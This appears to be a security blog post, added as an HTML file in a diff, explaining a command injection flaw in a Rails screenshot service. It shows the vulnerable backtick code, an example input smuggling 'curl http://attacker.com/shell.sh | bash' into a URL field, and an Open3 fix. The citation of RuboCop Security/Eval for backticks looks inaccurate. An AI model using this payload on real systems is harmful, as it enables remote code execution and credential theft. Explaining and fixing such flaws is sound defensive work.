@@ -1,0 +1,115 @@
+<!doctype html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="canonical" href="/notes/newsletter-preview-rce/">
+<link rel="stylesheet" href="/common.css">
+<script defer src="/common.js"></script>
+
+<title>Newsletter Preview — Remote Code Execution via Ruby Backtick Command Injection</title>
+
+<site-header></site-header>
+
+<blog-header>
+  <h1>Newsletter Preview — Remote Code Execution via Ruby Backtick Command Injection</h1>
+</blog-header>
+
+<blog-post-info>
+  <time datetime="2026-07-28">28 Jul 2026</time>
+  · 6 min read
+</blog-post-info>
+
+<tag-row>
+  <tag-chip title="ruby"></tag-chip>
+  <tag-chip title="rails"></tag-chip>
+  <tag-chip title="rce"></tag-chip>
+  <tag-chip title="command-injection"></tag-chip>
+  <tag-chip title="code-review"></tag-chip>
+  <tag-chip title="security"></tag-chip>
+  <tag-chip title="vulnerability"></tag-chip>
+  <tag-chip title="web"></tag-chip>
+</tag-row>
+
+<main appearance="prose">
+
+<p>This write-up breaks down a <strong>Critical Command Injection</strong> vulnerability discovered in the <strong>Newsletter Preview</strong> application — a Ruby on Rails service that generates PNG thumbnail previews of web pages using headless Chromium.</p>
+
+<box-note>
+  <strong>Severity:</strong> Critical (CVSS 9.8) &nbsp;·&nbsp; <strong>Class:</strong> OS Command Injection (CWE-78) &nbsp;·&nbsp; <strong>Platform:</strong> Ruby on Rails
+</box-note>
+
+<hr>
+
+<h2>The Vulnerability: Unsanitized URL in Shell Backticks</h2>
+
+<p>The <code>ScreenshotService</code> component accepts a user-supplied <code>preview_url</code> parameter and passes it directly into Ruby backtick execution syntax. Ruby backticks (<code>`...`</code>) invoke a subshell via <code>/bin/sh -c</code>, meaning shell metacharacters retain their operational semantics.</p>
+
+<code-block language="ruby">
+<pre><code>class ScreenshotService
+  def generate_preview(preview_url)
+    filename = "#{SecureRandom.uuid}.png"
+    output_path = SCREENSHOT_DIR.join(filename)
+
+    # VULNERABILITY: User-controlled preview_url interpolated inside backticks
+    result = `#{CHROME_PATH} --headless --disable-gpu \
+      --screenshot=#{output_path} --window-size=1200,800 \
+      #{preview_url} 2>&1`
+  end
+end</code></pre>
+</code-block>
+
+<h2>Exploit Mechanics</h2>
+
+<p>An attacker supplies command delimiters (<code>;</code>, <code>|</code>, <code>&</code>) within the <code>preview_url</code> parameter to hijack the shell execution context:</p>
+
+<code-block language="bash">
+<pre><code># Attacker Input (preview_url):
+http://example.com; curl http://attacker.com/shell.sh | bash #
+
+# Resulting Shell Command:
+/usr/bin/chromium-browser --headless [...] http://example.com; \
+  curl http://attacker.com/shell.sh | bash # 2>&1</code></pre>
+</code-block>
+
+<ol>
+  <li><strong>Chromium executes</strong> — headless capture of the URL proceeds normally.</li>
+  <li><strong>Semicolon separates commands</strong> — <code>/bin/sh</code> executes the subsequent command regardless of Chromium's exit code.</li>
+  <li><strong>Payload fires</strong> — <code>curl | bash</code> downloads and executes a remote script, spawning a reverse shell.</li>
+  <li><strong>Comment symbol (#)</strong> — neutralizes trailing arguments for clean syntax.</li>
+</ol>
+
+<h2>Technical Impact</h2>
+
+<ul>
+  <li><strong>Full RCE</strong> — arbitrary command execution under the web application / Sidekiq worker process.</li>
+  <li><strong>Credential Exfiltration</strong> — access to Rails environment config, API keys, database credentials, and cloud IMDS metadata endpoints.</li>
+  <li><strong>Lateral Movement</strong> — worker nodes typically reside in internal networks with access to staging databases, Redis, and object stores.</li>
+</ul>
+
+<h2>Remediation</h2>
+
+<p>The fix: <strong>never pass unvalidated user input to a shell interpreter.</strong> Use <code>Open3.capture2e</code> with array arguments — Ruby then executes the binary directly via <code>execve()</code>, rendering shell metacharacters harmless as literal string arguments.</p>
+
+<code-block language="ruby">
+<pre><code>require 'open3'
+
+stdout_and_stderr, status = Open3.capture2e(
+  CHROME_PATH,
+  '--headless',
+  '--disable-gpu',
+  "--screenshot=#{output_path}",
+  '--window-size=1200,800',
+  preview_url               # treated as literal arg, NOT shell-parsed
+)</code></pre>
+</code-block>
+
+<h2>Key Takeaways</h2>
+
+<ul>
+  <li><strong>Ban backticks in production</strong> — <code>`...`</code> and <code>%x{}</code> should be flagged by static analysis rules (RuboCop <code>Security/Eval</code>).</li>
+  <li><strong>Array-based execution</strong> — always separate executable path from arguments. The shell must never see user input.</li>
+  <li><strong>Input validation layer</strong> — enforce <code>URI.parse</code> with whitelisted protocols (http/https) before outbound operations.</li>
+</ul>
+
+</main>
+
+<site-footer></site-footer>
